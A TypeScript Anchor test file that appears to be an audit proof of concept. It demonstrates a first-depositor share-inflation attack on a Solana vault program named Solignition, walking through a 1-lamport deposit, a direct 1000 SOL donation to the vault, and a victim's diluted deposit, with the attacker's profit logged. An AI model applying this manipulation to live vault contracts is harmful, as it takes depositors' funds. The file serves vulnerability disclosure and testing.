import * as anchor from '@coral-xyz/anchor';
import { Program, BN } from '@coral-xyz/anchor';
import { Solignition } from '../target/types/solignition';
import { 
  PublicKey, 
  SystemProgram, 
  Transaction, 
  LAMPORTS_PER_SOL 
} from '@solana/web3.js';
import { expect } from 'chai';

describe('First Depositor Inflation Attack PoC', () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  
  const program = anchor.workspace.Solignition as Program<Solignition>;
  
  let alice: anchor.web3.Keypair;
  let bob: anchor.web3.Keypair;
  let vaultPDA: PublicKey;
  let protocolConfigPDA: PublicKey;

  before(async () => {
    alice = anchor.web3.Keypair.generate();
    bob = anchor.web3.Keypair.generate();
    
    // Airdrop funds
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(alice.publicKey, 2000 * LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(bob.publicKey, 1000 * LAMPORTS_PER_SOL)
    );

    // Find PDAs
    [vaultPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from('vault')],
      program.programId
    );
    
    [protocolConfigPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from('config')],
      program.programId
    );

    // Initialize protocol (assuming it's not initialized yet)
    // You may need to adjust this based on the actual initialization
  });

  it('Demonstrates First Depositor Inflation Attack', async () => {
    console.log('\n=== ATTACK DEMONSTRATION ===\n');

    // Step 1: Alice deposits 1 lamport
    console.log('Step 1: Alice deposits 1 lamport...');
    
    const [aliceDepositorPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from('depositor'), alice.publicKey.toBuffer()],
      program.programId
    );

    await program.methods
      .deposit(new BN(1))
      .accounts({
        depositor: alice.publicKey,
        depositorRecord: aliceDepositorPDA,
        vault: vaultPDA,
        protocolConfig: protocolConfigPDA,
        systemProgram: SystemProgram.programId,
      })
      .signers([alice])
      .rpc();

    let aliceRecord = await program.account.depositorRecord.fetch(aliceDepositorPDA);
    console.log('  ✓ Alice shares:', aliceRecord.shareAmount.toString());
    
    let config = await program.account.protocolConfig.fetch(protocolConfigPDA);
    console.log('  ✓ Total shares:', config.totalShares.toString());
    console.log('  ✓ Vault balance:', (await provider.connection.getBalance(vaultPDA)).toString());

    // Step 2: Alice directly transfers 1000 SOL to vault PDA (ATTACK!)
    console.log('\nStep 2: Alice directly transfers 1000 SOL to vault (MANIPULATION)...');
    
    const attackAmount = 1000 * LAMPORTS_PER_SOL;
    const attackTx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: alice.publicKey,
        toPubkey: vaultPDA,
        lamports: attackAmount,
      })
    );
    
    await provider.sendAndConfirm(attackTx, [alice]);
    
    const vaultBalanceAfterAttack = await provider.connection.getBalance(vaultPDA);
    console.log('  ✓ Vault balance after direct transfer:', vaultBalanceAfterAttack.toString());
    
    // Calculate new share price
    config = await program.account.protocolConfig.fetch(protocolConfigPDA);
    const sharePriceAfterAttack = (vaultBalanceAfterAttack * 1_000_000_000) / Number(config.totalShares);
    console.log('  ✓ Share price (inflated):', sharePriceAfterAttack.toFixed(0));

    // Step 3: Bob deposits 500 SOL
    console.log('\nStep 3: Bob deposits 500 SOL (VICTIM)...');
    
    const [bobDepositorPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from('depositor'), bob.publicKey.toBuffer()],
      program.programId
    );

    const bobDepositAmount = 500 * LAMPORTS_PER_SOL;
    const bobBalanceBefore = await provider.connection.getBalance(bob.publicKey);
    
    await program.methods
      .deposit(new BN(bobDepositAmount))
      .accounts({
        depositor: bob.publicKey,
        depositorRecord: bobDepositorPDA,
        vault: vaultPDA,
        protocolConfig: protocolConfigPDA,
        systemProgram: SystemProgram.programId,
      })
      .signers([bob])
      .rpc();

    const bobRecord = await program.account.depositorRecord.fetch(bobDepositorPDA);
    console.log('  ✓ Bob deposited:', bobDepositAmount.toString(), 'lamports');
    console.log('  ✓ Bob shares received:', bobRecord.shareAmount.toString());
    
    // Calculate expected shares vs actual shares
    const expectedShares = bobDepositAmount;  // Should be ~500 SOL worth
    const actualShares = Number(bobRecord.shareAmount);
    const sharesLoss = ((expectedShares - actualShares) / expectedShares * 100).toFixed(2);
    
    console.log('  ⚠️ Expected shares: ~', expectedShares.toString());
    console.log('  ⚠️ Actual shares:', actualShares.toString());
    console.log('  🚨 Bob lost', sharesLoss, '% of his shares!');

    // Step 4: Calculate Alice's profit potential
    console.log('\nStep 4: Alice can now withdraw and profit...');
    
    config = await program.account.protocolConfig.fetch(protocolConfigPDA);
    aliceRecord = await program.account.depositorRecord.fetch(aliceDepositorPDA);
    
    const aliceSharePercentage = (Number(aliceRecord.shareAmount) / Number(config.totalShares) * 100).toFixed(2);
    const vaultBalance = await provider.connection.getBalance(vaultPDA);
    const aliceCanWithdraw = Math.floor(vaultBalance * Number(aliceRecord.shareAmount) / Number(config.totalShares));
    
    console.log('  ✓ Alice owns', aliceSharePercentage, '% of shares');
    console.log('  ✓ Alice invested: 1 lamport + 1000 SOL');
    console.log('  ✓ Alice can withdraw:', aliceCanWithdraw.toString(), 'lamports');
    console.log('  💰 Alice profit:', (aliceCanWithdraw - attackAmount - 1).toString(), 'lamports');
    console.log('  💰 That is', ((aliceCanWithdraw - attackAmount - 1) / LAMPORTS_PER_SOL).toFixed(4), 'SOL stolen from Bob!');

    // Assertions
    expect(actualShares).to.be.lt(expectedShares / 100);  // Bob got <1% of expected shares
    expect(Number(aliceRecord.shareAmount)).to.be.gt(actualShares);  // Alice has more shares despite tiny initial deposit

    console.log('\n=== ATTACK SUCCESSFUL ===');
    console.log('🔴 CRITICAL VULNERABILITY CONFIRMED\n');
  });
});
